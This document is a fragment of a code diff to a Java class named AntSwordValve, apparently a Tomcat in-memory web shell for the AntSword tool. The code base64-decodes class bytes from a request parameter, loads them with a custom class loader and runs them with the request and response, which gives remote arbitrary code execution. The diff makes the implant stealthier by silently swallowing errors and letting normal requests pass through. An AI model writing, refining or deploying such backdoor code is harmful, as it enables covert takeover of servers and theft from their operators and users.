@@ -77,12 +77,10 @@ public class AntSwordValve extends ClassLoader implements Valve {
                 byte[] bytes = base64Decode(request.getParameter(pass));
                 Object instance = (new AntSwordValve(this.getClass().getClassLoader())).g(bytes).newInstance();
                 instance.equals(new Object[]{request, response});
-            } else {
-                this.getNext().invoke(request, response);
+                return;
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-            this.getNext().invoke(request, response);
+        } catch (Exception ignored) {
         }
+        this.getNext().invoke(request, response);
     }
 }
